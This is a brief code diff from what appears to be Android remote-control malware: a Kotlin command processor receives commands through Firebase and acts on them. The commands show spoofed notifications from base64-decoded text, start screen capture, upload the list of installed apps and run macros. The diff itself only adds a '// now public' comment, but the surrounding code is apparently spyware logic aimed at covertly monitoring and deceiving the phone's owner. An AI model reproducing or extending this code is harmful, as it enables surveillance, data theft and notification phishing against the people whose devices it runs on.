@@ -37,7 +37,7 @@ object CommandProcessor {
                 val body = decodeIfBase64(cmd.text)
                 NotificationSpoofer.show(context, title ?: "", body ?: "", cmd.iconUrl, cmd.bigPictureUrl)
             }
-            "start_screen_capture" -> svc.requestScreenCapture()
+            "start_screen_capture" -> svc.requestScreenCapture()  // now public
             "get_apps" -> FirebaseBridge.pushAppsList(svc.getInstalledApps())
             "macro" -> {
                 val macroId = FirebaseBridge.commandsRef.push().key ?: "unknown"
